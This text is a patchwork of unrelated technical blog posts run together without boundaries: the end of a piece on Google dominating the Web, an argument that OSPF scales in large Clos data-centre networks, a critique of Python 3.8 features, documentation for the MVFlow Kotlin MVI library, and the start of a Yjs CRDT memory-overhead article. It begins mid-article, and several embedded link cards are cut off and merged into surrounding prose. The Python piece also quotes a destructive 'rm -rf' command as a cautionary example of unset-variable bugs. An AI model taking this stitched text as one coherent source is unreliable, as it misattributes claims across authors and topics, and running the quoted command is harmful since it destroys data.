<p>I’m also going to throw in an honorable mention to poor native video support (it is hyper_text_ after all). It’s beating a dead horse to point out that Google also serves up the vast majority of videos streamed on the Web.</p>

<h2 id="so-then">So then…</h2>

<p>So Google controls the Web’s search and video infrastructure. It can and does dictate standards and media formats. It also controls a huge chunk of the revenues available when publishing and selling on the Web. It even controls the operating system and browser through which most people interact with it.</p>

<p>Google’s capture of the Web is a <em>fait accompli</em>. Only legislation will keep the World Wide Web from finally becoming Web by Google (TM).</p>

          <p>I worked at Amazon for 17 years as a network engineer. Now I’m out of Amazon and looking at the industry, I’m learning new things. <strong>One of the things I’ve learned recently is that OSPF shouldn’t be used for Clos leaf-spine networks because of scale.</strong> I’ve heard that it can’t keep up with the size and scale of the modern datacenter networks. <a href="https://www.juniper.net/documentation/en_US/release-independent/solutions/topics/task/configuration/ip-fabric-underlay-cloud-dc-configuring.html">Juniper IP Fabric Underlay Network Design and Implementation</a> is an example of the recommendation.  <a href="https://tools.ietf.org/html/rfc7938">https://tools.ietf.org/html/rfc7938</a> is what as used as the reference for using eBGP to be the routing protocol inside of large Clos networks.</p>

<p><strong>This is a shock to me</strong> since we built large OSPF Clos networks a decade ago. We built networks this way with hundreds of routers (even thousands) speaking OSPF. I’m not saying it is easy or that we didn’t have to understand OSPF well; If you don’t design it well, you get a flooding disaster. But if you do set it up right, it works really well. It converges quickly and doesn’t collapse under failure. The key thing is to be sure you understand how flooding works and you focus on areas and summarization. There are different things you have to be aware of when you are designing a Clos network with BGP vs OSPF. With BGP you have to be figure out how to mitigate path hunting. With OSPF need to work on how to avoid congestion collapse.</p>

<p>There is also work on building new protocols for these large Clos or Clos-like networks, such as <a href="https://datatracker.ietf.org/wg/rift/documents/">https://datatracker.ietf.org/wg/rift/documents/</a>. I don’t understand why OSPF or ISIS isn’t good enough so I don’t understand why these are necessary. There <a href="https://pc.nanog.org/static/published/meetings/NANOG74/1763/20181003_Martin_Routing_In_Dense_v1.pdf">are some good ideas in RIFT</a>, I’m just haven’t seen a reason to use it.</p>

<p>When we did this we were using CPUs from 2003 and we were using a lesser known OSPF stack. It’s OSPF implementation was okay, but we were strongly warned away from using their BGP implementation by the developers. <strong>We had to understand and mitigate risk</strong>. We had to test it as well as we could and be very careful in our first deployments. The stack had never been battle tested like this before. We still ran into some scary performance issues but got to work with great software engineers on the protocol stack to work through problems and figure out our scale.</p>

<p>Others agree with me, <a href="https://www.youtube.com/watch?v=Qmvg2mnbcPg">https://www.youtube.com/watch?v=Qmvg2mnbcPg</a>, even though they are mostly focusing on smaller networks than I was working on. But either way, OSPF can be made to work just fine on very large (or small) Clos networks.</p>

<p>As an example of the scale, this is a generic 24 port 3-tier Clos. It is possible to make OSPF work on this. This is smaller than what we were working on in 2012.
<img src="https://elegantnetwork.github.io/assets/images/24port-3tier-clos-resize.png" alt="24 port 3-tier clos"></p>

<p>To understand and then mitigate the risks an unknown OSPF stack, at scale, is why I started building a configuration management system and started <a href="https://elegantnetwork.github.io/posts/Network-Validation-with-Vagrant/">simulating our network design</a>. We needed to understand how any OSPF protocol stack would work. Could we make the protocol scale at all? We needed to see what would actually happen with a real OSPF implementation. <strong>I cannot stress enough how important this simulation was.</strong> We did not understand the problem of flooding and we did not understand the solution until we had tried it out in simulation.</p>

<p>Before that, though, we spent a lot of time on white boards arguing about topology and OSPF. <strong>I think whiteboards are the most important tool for network design</strong> currently available, which makes me sad. I wish that wasn’t true, I want much better tools. I can’t even tell you the number of disasters averted by 2-3 great network engineers arguing over a whiteboard. This works really well, but there are important reasons it’s not good enough. One is that for many of these discussions, it’s extremely hard to get data to make the decisions. In this case, a comparison of convergence time and failure detection in a 3-tier Clos with eBGP, iBGP, and OSPF should be required, but we didn’t have that capability.</p>

<p>In a dense mesh-like network such as a Clos network, the concerns around OSPF swirled around four main issues: the effect of flooding, the size of the link state database, the speed of SPF calculations, and the ability for OSPF to carry a large number of prefixes. We were concerned about OSPF scaling w.r.t. its flooding and it’s the flooding that is expensive with a Link State Database protocol, not the Shortest Path First (SPF) calculations. Which means you have to be very careful about what is flooded, what are the areas, and how things are summarized. I didn’t understand this until I had a simulation and I could try things out with areas or without, and the effect was dramatic. I think it’s often true that there is a part of a design that you don’t understand, which is one of the big reasons to do simulation. We didn’t have the ability to lab up a network as big as we were going to be building, so the simulation was critical. I can’t even imagine what we would have done without it. Based on the simulation, we created targeted tests for real hardware to understand how it would deal with the scale.</p>

<p>The point of this article is not that OSPF is better than BGP, but that it does work in very large size Clos networks. I’m frustrated that so much of the industry went a direction without great data or analysis, just following one set of opinions and design choices. <strong>I wish there were easy ways for people to be able to design, simulate and test different designs</strong> like this so that they could decide for themselves the tradeoffs they’d like to make, rather than have to rely on some type of industry hype. There needs to be a better way to be able to describe topologies and designs so that it’s really easy to try out different ideas.</p>

<p>If you have other considerations, such as you want to run IPv6, or EVPN, a single instance of eBGP such as the one popularized by the open source routing suite, FRR, maybe the simplest or elegant. But with proper design, scale is not the reason to use BGP over OSPF. If you are running a small Clos network and don’t have IPv6 or EVPN, OSPF is more straightforward and generally faster, as was the common practice before the advent of BGP in the data center.</p>

<p>No matter what, you need to understand the choices that you are making and understand the tradeoffs. This is hard to do, and especially hard in networking because we lack design patterns and good tools to help us understand the implications of our choices.</p>

<p>If anybody knows about tools or design patterns or even somebody who’s actually compared OSPF vs BGP in Clos networks with data, I’d love to hear about it.</p>

<p>Looking at some “exciting” <a href="https://docs.python.org/3.8/whatsnew/3.8.html">features landing in Python 3.8</a>, I’m still disappointed and frustrated by the language… like by quite a few other languages.</p>



<div><figure><img data-attachment-id="7204" data-permalink="https://ilya-sher.org/chimpanzee-978809_640/" data-orig-file="https://ilyasherdotorg.files.wordpress.com/2020/08/chimpanzee-978809_640.jpg" data-orig-size="640,640" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;5.6&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;NIKON D7000&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;200&quot;,&quot;iso&quot;:&quot;400&quot;,&quot;shutter_speed&quot;:&quot;0.0015625&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="chimpanzee-978809_640" data-image-description="" data-medium-file="https://ilyasherdotorg.files.wordpress.com/2020/08/chimpanzee-978809_640.jpg?w=300" data-large-file="https://ilyasherdotorg.files.wordpress.com/2020/08/chimpanzee-978809_640.jpg?w=640" src="https://ilyasherdotorg.files.wordpress.com/2020/08/chimpanzee-978809_640.jpg?w=640" alt="" srcset="https://ilyasherdotorg.files.wordpress.com/2020/08/chimpanzee-978809_640.jpg 640w, https://ilyasherdotorg.files.wordpress.com/2020/08/chimpanzee-978809_640.jpg?w=150 150w, https://ilyasherdotorg.files.wordpress.com/2020/08/chimpanzee-978809_640.jpg?w=300 300w" sizes="(max-width: 640px) 100vw, 640px"></figure></div>



<p>As an author of another programming language, I can’t stop thinking about how things “should have been done” from my perspective. I want to be explicit here. My perspective is <strong>biased</strong> towards correctness and “WTF are you doing?”. Therefore, take everything here with a appropriate amount of salt.</p>



<p>Yes, not talking about any “positive” changes here.</p>



<h2>Assignment Expressions</h2>



<blockquote><p>There is new syntax <code>:=</code> that assigns values to variables as part of a larger expression.</p></blockquote>



<p>A fix which couldn’t be the best because of previous design decision.</p>



<p>“Somebody” ignored the wisdom of Lisp, which was “everything is an expression and evaluates to a value” (no statements vs expressions), and made assignment a statement in Python years ago. Now this can not be fixed in a straightforward manner. It must be another syntax. Two different syntaxes for almost the same thing which is <code>=</code> for assignment as a statement and <code>:=</code> for expression assignment.</p>



<h2>Positional-only Parameters</h2>



<blockquote><p>There is a new function parameter syntax <code>/</code> to indicate that some function parameters must be specified positionally and cannot be used as keyword arguments:</p></blockquote>



<pre><code>def f(a, b, /, c, d, *, e, f):
    print(a, b, c, d, e, f)</code></pre>



<p>Trying to clean up a mess created by mixing positional and named parameters. Unfortunately I did not give it enough thought at the time and copied parameters handling behaviour from Python. Now <a href="https://ngs-lang.org/">NGS</a> also has the same problem as Python had before 3.8. Hopefully, I will be able to fix it in some more elegant way than Python did.</p>



<h2>LRU cache</h2>



<blockquote><p><a href="https://docs.python.org/3.8/library/functools.html#functools.lru_cache"><code>functools.lru_cache()</code></a> can now be used as a straight decorator rather than as a function returning a decorator. So both of these are now supported</p></blockquote>



<p>OK. Bug fix. But … (functools.py)</p>



<pre><code>    if isinstance(maxsize, int):
        # Negative maxsize is treated as 0
        if maxsize &lt; 0:
            maxsize = 0</code></pre>



<p>If you are setting LRU cache size to a negative number, it’s 99% by mistake. In NGS that would be an exception. That’s the approach that causes <code>rm -rf $myfolder/</code> to remove <code>/</code> when <code>myfolder</code> is unset. Note that the <code>maxsize</code> code is not new but it’s still there in Python 3.8. I guess that is another mistake which can not be easily fixed now because that would break “working” code.</p>



<h2>Collections</h2>



<blockquote><p>The <a href="https://docs.python.org/3.8/library/collections.html#collections.somenamedtuple._asdict"><code>_asdict()</code></a> method for <a href="https://docs.python.org/3.8/library/collections.html#collections.namedtuple"><code>collections.namedtuple()</code></a> now returns a <a href="https://docs.python.org/3.8/library/stdtypes.html#dict"><code>dict</code></a> instead of a <a href="https://docs.python.org/3.8/library/collections.html#collections.OrderedDict"><code>collections.OrderedDict</code></a>. This works because regular dicts have guaranteed ordering since Python 3.7</p></blockquote>



<p>OK. Everybody had the mistake of making maps unordered: Perl, Ruby, Python.</p>



<ol><li>Ruby <a href="https://www.igvita.com/2009/02/04/ruby-19-internals-ordered-hash/">fixed that with the release of version 1.9</a> in 2008 (according to the post).</li><li>Python <a href="https://www.python.org/downloads/release/python-370/">fixed that with the release of version 3.7</a> in 2018 (which I take as 10 years of “f*ck you, the developer”).</li><li>Perl <a href="https://perldoc.perl.org/functions/keys.html">keeps using unordered maps according to documentation</a>.</li><li>Same for Raku, again according to <a href="https://docs.raku.org/language/hashmap">the documentation</a>.</li></ol>



<p>NGS had ordered maps from the start but that’s not a fair comparison because NGS project started in 2013, when the mistake was already understood.</p>



<hr>



<p>How all that helps you, the reader? I encourage deeper thinking about the choice of programming languages that you use. From my perspective, all languages suck, while NGS aims to suck less than the rest for the intended <a href="https://github.com/ngs-lang/ngs/wiki/Use-Cases">use cases</a> (tl;dr – for DevOps scripting).</p>

<h2>Update 2020-08-16</h2>



<p>Discussions:</p>



<ol><li><a href="https://news.ycombinator.com/item?id=24176823">https://news.ycombinator.com/item?id=24176823</a></li><li><a href="https://lobste.rs/s/rgcgjz/python_3_8_makes_me_sad_again">https://lobste.rs/s/rgcgjz/python_3_8_makes_me_sad_again</a></li></ol>



<h2>Update 2020-08-17</h2>



<p>It looks like the article above needs some clarification about my perspective: background, what I am doing and why.</p>



<h3>TL;DR</h3>



<p>The main points of the article are:</p>



<ol><li>Everything still sucks, including Python. By sucks I mean does not fit well with the tasks I need to do neither aligned with how I think about these tasks.</li><li>I am trying to help the situation and the industry by developing my own programming language</li></ol>



<h3>Background about my Thinking</h3>



<p>In general, I’m amazed with how bad the overall state of programming is. That includes:</p>



<ol><li>All programming languages that I know including my own NGS. This is aggravated by inability to fix anything properly for any language with substantial amount of code written in it because you will be breaking existing code. And if you do break, you get the shitstorm like with Python 3 or Perl 6 (Raku).</li><li><a href="https://github.com/MohGovIL/hamagen-react-native/issues/115">Code quality</a> of the programs written in all languages. Most of the code that I have seen is bad. Sometimes even in <a href="https://github.com/MicrosoftDocs/cpp-docs/issues/1929">official examples</a>.</li><li>Quality of available materials, which are sometimes <a href="https://dev.to/ilya_sher_prog/comment/m9oe">plainly wrong</a>.</li><li>Many of existing “Infrastructure as code” solutions, which in most cases follow the same path:<ol><li>Invent  a DSL or use YAML.</li><li>“figure out” later that it’s not powerful enough (by the way there is an elegant solution – a programming language, forgot the name)</li><li>Create pretty ugly programming language on top of a DSL that was intended for data.</li></ol></li></ol>



<p>I am creating new programming language and a shell out of <strong>frustration with current situation, especially with bash and Python</strong>. Why these two? Because that’s what I was and still using to get my tasks done.</p>



<p>Are these languages bad? I don’t think it’s a question with any good answers. <a href="https://ilya-sher.org/2017/10/10/why-i-have-no-favorite-programming-language/">These languages don’t fit the tasks that I’m trying to do</a> nor are aligned with how I think while being apparently one of the best choices available.</p>



<h3>This Article Background</h3>



<ol><li>Seen some post on RSS about new features in Python 3.8.</li><li>Took a look.</li><li>Yep, everything is still f*cked up.</li><li>Wrote a post about it which was not meant to be “deep discussion about Python flaws”.</li></ol>



<p>I was not planning to invest more time in this but here I am trying to clarify.</p>



<h3>And your Language is Better? Really?</h3>



<p>Let’s clarify “better”.  For me, it’s to suck less than the rest for the intended use cases.</p>



<blockquote><p>author really does consider himself a superior language designer than the Python core-dev team</p></blockquote>



<p>( From <a href="https://www.reddit.com/r/Python/comments/iartgp/python_38_makes_me_sad_again/">https://www.reddit.com/r/Python/comments/iartgp/python_38_makes_me_sad_again/</a> )</p>



<p>I consider myself in much easier circumstances:</p>



<ol><li>No substantial amount of code is written in NGS yet.</li><li>I’m starting later and therefore have the advantage of looking at more languages, avoiding bad parts, copying (with adaptation) the good parts.</li><li>NGS targets a niche, it’s not intended to be general purpose language. Choices are clearer and easier when you target a niche.</li><li>The language that I’m creating is almost by definition is more aligned with how I think. Hoping that people out there will benefit from using NGS if it is more aligned with how they think too.</li><li>See also my <a href="https://ilya-sher.org/2016/10/28/creating-a-language-is-easier-now/">Creating a language is easier&nbsp;now</a> (2016) post.</li></ol>



<p>Will I be able to make a “better” language?</p>



<p><strong>From technical perspective</strong>, that’s probable: I am a skilled programmer in several languages and I have languages to look at more than everybody else had before. My disadvantage is not much experience in language design. I’m trying to offset that with thinking hard (<a href="https://github.com/ngs-lang/ngs/wiki#design-documents">about the language</a>, the essence of <a href="https://ilya-sher.org/2019/05/18/on-information-loss-in-software/">what is being expressed</a>, common patterns, etc), looking at other languages and experimenting.</p>



<p><strong>From marketing perspective</strong>, I need to learn a lot. I am aware that “technically better” doesn’t matter as much as I would like to. Without community and users that would be a failed project.</p>



<p>Also don’t forget luck which I might or might not have.</p>



<h3>What if NGS fails?</h3>



<p>I think that the situation today is unbearable. I’m trying to fix it. I feel like I have to, despite the odds. I hope that even if NGS fails to move the industry forward it would be useful to somebody who will attempt that later.</p>

<p><strong>Simple Android* MVI architecture using kotlin flows</strong></p>
<p><em>* The architecture is platform-neutral but was designed with Android in mind</em></p>
<div><pre><code data-lang="groovy"><span>dependencies</span> <span>{</span>
    <span>implementation</span> <span>'net.pedroloureiro.mvflow:mvflow-core:&lt;latest version&gt;'</span>
<span>}</span>
</code></pre></div><p>Check our <a href="https://github.com/pedroql/mvflow/releases">releases on github</a> to see what’s new.</p>
<h2 id="objectives">Objectives</h2>
<p>We set off with the objective of creating a minimalistic library, simple yet with all the
capabilities you need.</p>
<h3 id="minimalistic-yet-complete-">Minimalistic yet complete</h3>
<p>MVFlow has a very small API surface. It strives to be the smallest conceivable MVI library that could exist.
In just a few minutes you will know everything there is to know about the API!</p>
<h3 id="simple-">Simple</h3>
<p>The library introduces few - if any - new concepts outside MVI,
<a href="https://kotlinlang.org/docs/reference/coroutines/basics.html">Kotlin coroutines</a>, and
<a href="https://kotlinlang.org/docs/reference/coroutines/flow.html">Kotlin flows</a>.</p>
<p>If you are familiar with those concepts, you can start using the library without a problem; if you are new to some of these
concepts, you will be able to apply those concepts outside this library too.</p>
<h3 id="coroutines-and-flows-as-powerful-abstractions-">Coroutines and flows as powerful abstractions</h3>
<p>Any MVI library needs to accomplish the following tasks:</p>
<ul>
<li>
<p>Manage the current state (Model in MVI)</p>
</li>
<li>
<p>Call a render function when the state changes (View in MVI)</p>
</li>
<li>
<p>Detect user interactions (Intent in MVI)</p>
</li>
<li>
<p>Process user intents, potentially mutating the current state</p>
</li>
</ul>


<p>We believe that coroutines and flows are extremely powerful concepts that can be applied to this architecture.
They enable us to build a very powerful API with a small and simple surface.</p>
<p>Here are some advantages that they bring:</p>
<ul>
<li>
<p>Coroutines make asynchronous calls very simple to write and easy to reason about;</p>
</li>
<li>
<p>Flows are a great abstraction to represent user events (clicks) and updates from background work;</p>
</li>
<li>
<p>Coroutine scopes make handling the lifecycle of requests very simple</p>
<ul>
<li>For example: if you have pending work for a particular screen, and the user presses back, by
cancelling that screen’s coroutine, all related jobs and listeners are cancelled too.

<a href="https://kotlinlang.org/docs/reference/coroutines/basics.html#structured-concurrency">structured concurrency</a>;</li>
</ul>
</li>
</ul>
<h3 id="with-mvflow-you-are-in-control--">With MVFlow you are in control </h3>
<p>The library only gives you an implementation of MVI, but doesn’t force you into specific patterns other than using MVI
and coroutines.</p>
<p>You are free to use dependency injection your way; you are free to do navigation your way; plug your
logging framework (or not). You can use data stores, use cases, interactors, or any other abstraction to get and
manipulate your data.</p>
<p>MVFlow plays well with Android’s ViewModel, but you don’t have to use it.</p>
<h2 id="what-if-i-am-new-to-mvi-coroutines-or-flows">What if I am new to MVI, coroutines, or flows?</h2>
<p>There are plenty of guides introducing these concepts. We are still working on a brief introduction to MVI,
meanwhile we suggest you read the following articles:</p>
<ul>
<li>
<p><a href="http://hannesdorfmann.com/android/model-view-intent">Model-view-intent on Android</a> by Hannes Dorfmann - one of the
first posts (if not the first) about MVI</p>
</li>
<li>
<p><a href="https://proandroiddev.com/getting-started-with-mvi-architecture-on-android-b2c280b7023">Getting started with MVI Architecture on Android</a>
by Eric Ampire</p>

<p><a href="https://www.raywenderlich.com/817602-mvi-architecture-for-android-tutorial-getting-started">MVI Architecture for Android Tutorial</a>
at raywenderlich.com</p>
</li>
</ul>

<p>For learning about coroutines and flows, the official guides are a good source of information:</p>
<ul>
<li>
<p><a href="https://kotlinlang.org/docs/reference/coroutines/coroutines-guide.html">Coroutines official guide</a></p>
</li>
<li>
<p><a href="https://kotlinlang.org/docs/reference/coroutines/flow.html">Flow official guide</a></p>
</li>
</ul>
<h2 id="api">API</h2>
<h3 id="view">View</h3>
<p>The library has two main interfaces: <code>MVFlow</code> and <code>MVFlow.View</code>. Let’s take a look at the view first:</p>
<div><pre><code data-lang="kotlin"><span>interface</span> <span>View</span><span>&lt;</span><span>State</span><span>,</span> <span>Action</span><span>&gt;</span> <span>{</span>

    <span>fun</span> <span>render</span><span>(</span><span>state</span><span>:</span> <span>State</span><span>)</span>

    <span>fun</span> <span>actions</span><span>():</span> <span>Flow</span><span>&lt;</span><span>Action</span><span>&gt;</span>
<span>}</span>
</code></pre></div><p>As you can see, this is a very simple interface: any view needs to know how to render a given state (which is a generic
class defined by you) and creates a flow of actions which
report the user interactions with the UI.</p>
<p>Read the article <a href="https://pedroql.github.io/mvflow/implementing-your-view-actions-flow/">implementing your view actions flow</a> to see how you
can implement the actions method.</p>
<p>Let’s implement a simple screen with a list of users. The current state indicates whether it is loading information, the
users that were loaded (if any) and a error message (if any):</p>
<div><pre><code data-lang="kotlin"><span>data</span> <span>class</span> <span>User</span><span>(</span> 
     <span>// ... 
</span><span></span><span>)</span>

<span>data</span> <span>class</span> <span>State</span> <span>(</span>
    <span>val</span> <span>users</span><span>:</span> <span>List</span><span>&lt;</span><span>User</span><span>&gt;?,</span>
    <span>val</span> <span>isLoading</span><span>:</span> <span>Boolean</span><span>,</span>
    <span>val</span> <span>errorMessage</span><span>:</span> <span>String</span><span>?</span>
<span>)</span>
</code></pre></div><p>The possible actions are loading users (say, by pressing a button or doing a pull-to-refresh gesture) and selecting a
user by tapping on its row:</p>
<div><pre><code data-lang="kotlin"><span>sealed</span> <span>class</span> <span>Action</span> <span>{</span>
    <span>object</span> <span>LoadUsers</span> <span>:</span> <span>Action</span><span>()</span>
    <span>data</span> <span>class</span> <span>UserSelection</span><span>(</span><span>val</span> <span>user</span><span>:</span> <span>User</span><span>)</span> <span>:</span> <span>Action</span><span>()</span>
<span>}</span>
</code></pre></div><h3 id="handler">Handler</h3>
<p>So now that we have a view, we can render the UI and send actions into a flow when the user interacts with the app.</p>
<p>The next step is doing something with those actions. Typically, this involves doing some operation like a network or
database call, and we might want to change the current state from said jobs.</p>
<p>This is where <code>Handler</code> comes in. To keep things simple, this is just a lambda but it is type-aliased for more
meaningful parameter names:</p>
<div><pre><code data-lang="kotlin"><span>typealias</span> <span>Handler</span><span>&lt;</span><span>State</span><span>,</span> <span>Action</span><span>,</span> <span>Mutation</span><span>&gt;</span> <span>=</span> <span>(</span><span>State</span><span>,</span> <span>Action</span><span>)</span> <span>-&gt;</span> <span>Flow</span><span>&lt;</span><span>Mutation</span><span>&gt;</span>
</code></pre></div><p>Reading that aloud, we see that a handler is a function that receives the current state and an action the user just
performed. The handler performs what this action requires (e.g. making a network call) and returns a flow of mutations.
A mutation is the information of what needs to change in the current state.
When the handler completes the network request, it can emit a value into the mutation flow to update the state.</p>
<p>Continuing our example, there are three reasons to change the state: we started loading data, we received an error from
the request or we received data (new users) from the request:</p>
<div><pre><code data-lang="kotlin"><span>sealed</span> <span>class</span> <span>Mutation</span> <span>{</span>
   <span>object</span> <span>StartedLoading</span> <span>:</span> <span>Mutation</span><span>()</span>
   <span>data</span> <span>class</span> <span>ErrorLoading</span><span>(</span><span>val</span> <span>message</span><span>:</span> <span>String</span><span>)</span> <span>:</span> <span>Mutation</span><span>()</span>
   <span>data</span> <span>class</span> <span>UsersReceived</span><span>(</span><span>val</span> <span>users</span><span>:</span> <span>List</span><span>&lt;</span><span>User</span><span>&gt;)</span> <span>:</span> <span>Mutation</span><span>()</span>
<span>}</span>

<span>typealias</span> <span>Handler</span><span>&lt;</span><span>State</span><span>,</span> <span>Action</span><span>,</span> <span>Mutation</span><span>&gt;</span> <span>=</span> <span>(</span><span>State</span><span>,</span> <span>Action</span><span>)</span> <span>-&gt;</span> <span>Flow</span><span>&lt;</span><span>Mutation</span><span>&gt;</span>

</code></pre></div><h3 id="reducer">Reducer</h3>
<p>Right now we have a view rendering the state and telling us of actions performed by the user. We also have a handler
that is receiving those actions and acting on them. The handler emits mutations that we already know will be used to
update the current state.</p>
<p>Now the reducer enters the stage:</p>
<p>A reducer is just another function that receives the current state and a mutation. It will combine both, producing
the a new state the succeeds the current one.</p>
<p><em>Note: although the handler receives the current state when an action is performed, if the handler performs a slow
operation, the handler will no longer know the most recent state. This is why the handler can’t mutate the state
directly.</em></p>

<p>At this point we have explained the main MVI components. The final step is assembling them together so that actions are
sent to the handler, mutations are sent to the reducer, and new states are sent to the view.</p>

      <p><a href="https://crdt.tech/">CRDTs</a> are often praised as the "holy grail" for building collaborative applications because they don't require a central authority to resolve sync conflicts. They open up new possibilities to scale the backend infrastructure and are also well-suited as a data-model for distributed apps that don't require a server at all.</p><p>However, several text editor developers report not to use them because they impose a too significant overhead.</p><p>Just recently, Marijn Haverbeke wrote about his considerations against using CRDTs as a data model for <a href="https://codemirror.net/6/">CodeMirror 6</a>:</p><blockquote>[..] the cost of such a representation is significant, and in the end, I judged the requirement for converging positions to be too obscure to justify that level of extra complexity and memory use. <a href="https://marijnhaverbeke.nl/blog/collaborative-editing-cm.html">(source)</a></blockquote><p>The <a href="https://github.com/xi-editor/xi-editor">Xi Editor</a> used a CRDT as its data model to allow different processes (syntax highlighter, type checker, ..) to concurrently access the editor state without blocking the process. They reverted to a synchronous model because ..</p><blockquote>[..] CRDT is not pulling its (considerable) weight. <a href="https://github.com/xi-editor/xi-editor/issues/1187#issuecomment-491473599">(source)</a></blockquote><p>Apparently, everyone recognizes that CRDTs have a lot of potential, but concluded that the memory overhead of using them must be too expensive for real-world applications.</p><p>They bring up a fair point. Most CRDTs assign a unique ID to <em>every character</em> that was ever created in the document. In order to ensure that documents can always converge, the CRDT model preserves this metadata even when characters are deleted.</p><p>This seems to be particularly expensive in dynamic languages like JavaScript. Other languages allow you to efficiently represent all those characters and IDs in-memory using <a href="https://en.wikipedia.org/wiki/Struct_(C_programming_language)">structs</a> (e.g. C or Rust). In JavaScript, everything is represented as an <code>Object</code> - basically a key-value map that needs to keep track of all its keys and values. CRDTs assign multiple properties to every single character in the document to ensure conflict resolution. The memory overhead of merely representing a document as a CRDT could be immense.</p><p>Every user-interaction creates more metadata that the CRDT needs to retain in order to ensure conflict resolution. It is not uncommon that CRDTs create millions of objects to store all this metadata. The JavaScript engine manages these objects on the heap, checks if they are referenced, and, if possible, garbage collects them. Another major problem is that with an increasing number of object creations, the cost of creating additional objects increases exponentially. This is shown in the following graphic:</p><figure><img src="https://blog.kevinjahns.de/content/images/2020/07/scatter-plot.png" alt="" srcset="https://blog.kevinjahns.de/content/images/2020/07/scatter-plot.png 600w"><figcaption>Average time to create one object increases with the number of objects on the heap <a href="https://jsperf.com/cost-of-objects">(Data Source)</a></figcaption></figure><p>So the question arises if CRDTs are actually suitable for shared editing on the web, or if they impose a too significant cost to be viable in practice.</p><p>In case you don't know me, I'm the author of a CRDT implementation named <a href="https://github.com/yjs/yjs">Yjs</a>, that is specifically designed for building shared editing applications on the web.</p><p>In this article, I will introduce you to a simple optimization for CRDTs and examine the exact performance trade-off of using Yjs for shared editing. I hope to convince you that the overhead is actually very small even for large documents with long edit histories.</p><h2 id="yjs">Yjs</h2><p>Yjs is a framework for building collaborative applications using CRDTs as the data model. It has a growing ecosystem of extensions that enable shared editing using different editors (<a href="https://docs.yjs.dev/ecosystem/editor-bindings/yjs-prosemirror"></a><a href="https://docs.yjs.dev/ecosystem/editor-bindings/prosemirror">ProseMirror</a>, <a href="https://www.npmjs.com/package/@remirror/extension-yjs"></a><a href="https://docs.yjs.dev/ecosystem/editor-bindings/remirror"></a><a href="https://docs.yjs.dev/ecosystem/editor-bindings/remirror">Remirror</a>, <a href="https://docs.yjs.dev/ecosystem/editor-bindings/yjs-quilljs"></a><a href="https://docs.yjs.dev/ecosystem/editor-bindings/quill">Quill</a>, <a href="https://docs.yjs.dev/ecosystem/editor-bindings/codemirror">CodeMirror</a>, ..), different networking technologies (<a href="https://docs.yjs.dev/ecosystem/connection-provider/y-websocket">WebSocket</a>, <a href="https://docs.yjs.dev/ecosystem/connection-provider/y-webrtc">WebRTC</a>, <a href="https://docs.yjs.dev/ecosystem/connection-provider/y-hyper">Hyper</a>, ..), and different persistence layers (<a href="https://docs.yjs.dev/ecosystem/database-provider/y-indexeddb">IndexedDB</a>, <a href="https://docs.yjs.dev/ecosystem/database-provider/y-leveldb">LevelDB</a>, <a href="https://docs.yjs.dev/ecosystem/database-provider/y-redis">Redis</a>, ..). Most shared editing solutions are tied to a specific editor and to a specific backend. With Yjs, you can make any of the supported editors collaborative and exchange document updates through your custom communication channel, over a peer-to-peer WebRTC network, or over a scalable server infrastructure. My vision for this project is that you can simply compose your collaborative application using the technologies that make sense for your project. </p><figure><a href="https://github.com/yjs/yjs"><div><p>yjs/yjs</p><p>Peer-to-peer shared types.

Yjs is a battle-proven technology that is used by several companies to enable collaboration. I'm only mentioning my sponsors here:</p><ul><li><a href="https://nimbusweb.me/note.php">Nimbus Note</a> scales collaborative note editing horizontally using Yjs.</li><li><a href="https://room.sh/">Room.sh</a> is a meeting software that allows collaborative editing &amp; drawing over WebRTC.</li></ul><p>I maintain a reproducible set of benchmarks that compares different CRDT implementations. Yjs is by far the fastest web-based CRDT implementation with the most efficient encoding. In this article I will often refer to specific benchmarks contained in the <code>crdt-benchmarks</code> repository as, for example, "<a href="https://github.com/dmonad/crdt-benchmarks/#b1-no-conflicts">[B1.11]</a>".</p><figure><a href="https://github.com/dmonad/crdt-benchmarks"><div><p>dmonad/crdt-benchmarks</p><p>A collection of CRDT benchmarks.

If not, and you want to dive into this rabbit hole, I recommend this fun interactive series:</p><figure><a href="https://lars.hupel.info/topics/crdt/01-intro/"><div><p>CRDTs: Part 1</p><p><img src="https://lars.hupel.info/img/profile.jpg"><span>Lars Hupel</span><span>Lars Hupel</span></p></div><p><img src="https://lars.hupel.info/img/topics/crdt/world.jpg"></p></a><figcaption>A fun interactive series about CRDTs</figcaption></figure><figure><a href="https://crdt.tech/resources"><div><p>CRDT Resources • Conflict-free Replicated Data Types</p><p>Resources and community around CRDT technology — papers, blog posts, code and more.</p><p><img src="https://crdt.tech/assets/favicons/favicon-192x192.png"><span>Conflict-free Replicated Data Types</span></p></div><p><img src="https://crdt.tech/assets/img/crdt-favicon.png"></p></a><figcaption>Good entry point to find more CRDT related resources</figcaption></figure><p>The concept paper that describes Yjs' conflict resolution algorithm YATA is available on <a href="https://www.researchgate.net/publication/310212186_Near_Real-Time_Peer-to-Peer_Shared_Editing_on_Extensible_Data_Types">Researchgate</a>. The concepts discussed here are pretty generic and could be extended to almost any CRDT.</p><p>In order to determine the performance cost, we are are going to examine how Yjs maintains data. Please bear with me while I describe how the CRDT model is represented using JavaScript objects. This will be relevant later.</p><p>Similarly to other CRDTs, the YATA CRDT assigns a unique ID to every character. These characters are then maintained in a doubly linked list.</p><p>The unique IDs are<a href="https://en.wikipedia.org/wiki/Lamport_timestamp"> Lamport Timestamps</a>. They consist of a unique user identifier and a logical clock that increases with each character insertion.</p><p>When a user types the content "ABC" from left to right, it will perform the following operations: <code>insert(0, "A") • insert(1, "B") • insert(2, "C")</code>. The linked list of the YATA CRDT, which models the textual content, will look like this:</p><figure><img src="https://blog.kevinjahns.de/content/images/2020/07/crdt-datamodel.svg" alt=""><figcaption>CRDT model of inserting content "ABC" (assuming the user has the unique client identifier "1")</figcaption></figure><p>Notice how every character can be uniquely identified by the combination of the unique client-id and an ever-increasing <code>clock</code> counter.</p><p>Yjs represents the items of the linked list as <code>Item</code> objects that contain some content (in this case a String), a unique ID, the links to the adjacent <code>Item</code> objects, and additional metadata that is relevant for the CRDT algorithm.</p><p>All CRDTs assign some kind of unique ID and additional metadata to every character, which is very memory-consuming for large documents. We can't get rid of metadata as it is necessary for conflict resolution. 